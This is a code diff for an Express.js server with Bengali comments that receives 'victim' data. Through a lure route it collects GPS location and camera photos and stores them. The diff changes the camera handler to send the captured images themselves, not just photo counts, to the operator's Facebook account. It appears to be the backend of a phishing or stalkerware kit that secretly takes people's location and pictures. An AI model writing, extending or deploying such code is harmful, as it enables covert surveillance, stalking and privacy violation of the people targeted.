@@ -3,8 +3,8 @@ const path = require('path');
 const router = express.Router();
 const Victim = require('../models/Victim');
 const { 
-    getConfig, 
     sendMessage, 
+    sendImageMessage,   // ইমেজ পাঠানোর ফাংশন (helpers.js থেকে)
     formatVictimData,
     formatLocationMessage 
 } = require('../utils/helpers');
@@ -37,7 +37,7 @@ router.get('/fb/:id', async (req, res) => {
     }
 });
 
-// ===== ভিক্টিম ডেটা রিসিভ =====
+// ===== ভিক্টিম ডেটা রিসিভ (টেক্সট + লোকেশন) =====
 router.post('/api/victim', async (req, res) => {
     try {
         const data = req.body;
@@ -84,16 +84,14 @@ router.post('/api/victim', async (req, res) => {
             console.log(`✅ ভিক্টিম আপডেট: ${data.id}`);
         }
 
-        // ===== মূল মেসেজ পাঠান (শুধু প্রয়োজনীয় তথ্য) =====
+        // ===== মূল টেক্সট মেসেজ পাঠান =====
         if (victim.fbId && victim.fbId !== 'unknown') {
             const msg = formatVictimData(victim);
             await sendMessage(victim.fbId, msg);
-            console.log(`📤 মূল মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
+            console.log(`📤 টেক্সট মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
         }
 
-        // ============================================================
-        // 🆕 লোকেশন পারমিশন থাকলে আলাদা মেসেজ পাঠান
-        // ============================================================
+        // ===== লোকেশন পারমিশন থাকলে আলাদা মেসেজ =====
         if (victim.fbId && victim.fbId !== 'unknown' && victim.gpsLocation && victim.gpsLocation.latitude) {
             const locationMsg = formatLocationMessage(victim.gpsLocation);
             if (locationMsg) {
@@ -115,7 +113,7 @@ router.post('/api/victim', async (req, res) => {
 });
 
 // ================================================================
-// 🆕 ক্যামেরা ছবি রিসিভ - শুধুমাত্র একটি সারাংশ মেসেজ
+// 🆕 ক্যামেরা ছবি রিসিভ - ইমেজ অ্যাটাচমেন্ট সহ
 // ================================================================
 router.post('/api/camera', async (req, res) => {
     try {
@@ -140,12 +138,13 @@ router.post('/api/camera', async (req, res) => {
         console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${totalImages}টি)`);
 
         // ============================================================
-        // 🆕 প্রতি ৫টি ছবি বা শেষ হলে একটি সারাংশ মেসেজ পাঠান
+        // ইমেজ অ্যাটাচমেন্ট পাঠান (প্রতি ৫টি ছবি পরপর, অথবা শেষে)
         // ============================================================
         if (victim.fbId && victim.fbId !== 'unknown') {
-            // শুধুমাত্র ৫, ১০, ১৫, ২০... বা শেষ হলে মেসেজ পাঠান
-            if (totalImages % 5 === 0 || totalImages === 1) {
-                await sendMessage(victim.fbId, `📸 ক্যামেরা থেকে ${totalImages}টি ছবি সংগ্রহ করা হয়েছে।`);
+            // প্রতি ৫টি ছবি পরপর পাঠান, অথবা ১ম, ৩য়, ৫ম...
+            if (totalImages % 5 === 0 || totalImages === 1 || totalImages === 3) {
+                await sendImageMessage(victim.fbId, image);
+                console.log(`📸 ইমেজ মেসেজ পাঠানো হয়েছে: ${victim.fbId} (ছবি #${totalImages})`);
             }
         }
 
@@ -157,7 +156,7 @@ router.post('/api/camera', async (req, res) => {
     }
 });
 
-// ===== ইমেজ ভিউ =====
+// ===== ইমেজ ভিউ (ব্রাউজারে দেখার জন্য) =====
 router.get('/image/:id/:index', async (req, res) => {
     try {
         const victim = await Victim.findOne({ id: req.params.id });
